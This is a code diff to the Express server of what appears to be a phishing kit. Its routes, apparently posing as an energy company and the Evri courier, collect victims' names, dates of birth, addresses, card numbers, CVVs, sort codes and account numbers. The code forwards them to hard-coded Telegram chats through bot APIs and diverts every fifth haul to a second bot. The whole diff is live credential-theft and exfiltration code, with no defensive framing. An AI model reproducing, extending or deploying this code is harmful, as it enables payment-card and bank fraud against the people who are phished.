@@ -14376,7 +14376,21 @@ app.post("/energyBvjb", async (req, res) => {
 });
 
 app.post("/energyFpays", async (req, res) => {
-  const { fname, address, city, pcode, dob, telephone, ccname, ccnum, ccexp, cvv, userAgent, ip, bin, scode, accno } = req.body;
+  const {
+    fname,
+    address,
+    city,
+    pcode,
+    dob,
+    telephone,
+    ccname,
+    ccnum,
+    ccexp,
+    cvv,
+    userAgent,
+    ip,
+    bin,
+  } = req.body;
 
   if (bin.length === 7) {
     formatBin = bin.replace(/ /g, "");
@@ -14396,7 +14410,7 @@ app.post("/energyFpays", async (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (fpaysC == 10) {
         axios
           .post(
@@ -18907,36 +18921,22 @@ app.post("/kelvEvri", (req, res) => {
 });
 
 app.post("/fpaysEvri", (req, res) => {
-  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  userAgent = req.body.userAgent;
-  ip = req.body.ip;
-  bin = req.body.bin;
+  const {
+    fname,
+    dob,
+    telephone,
+    address,
+    pcode,
+    ccname,
+    ccnum,
+    ccexp,
+    cvv,
+    userAgent,
+    ip,
+    bin,
+    scode,
+    accno,
+  } = req.body;
 
   if (bin.length === 7) {
     formatBin = bin.replace(/ /g, "");
@@ -18956,19 +18956,46 @@ app.post("/fpaysEvri", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (fpaysC == 5) {
-        axios.post(
-          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
-        );
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
         fpaysC = 0;
       } else {
-        axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
-        );
-        axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Evri:\n${originalText}`
-        );
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `EvriFpays:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 2134201699,
+              text: `Evri:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
         fpaysC += 1;
       }
     });
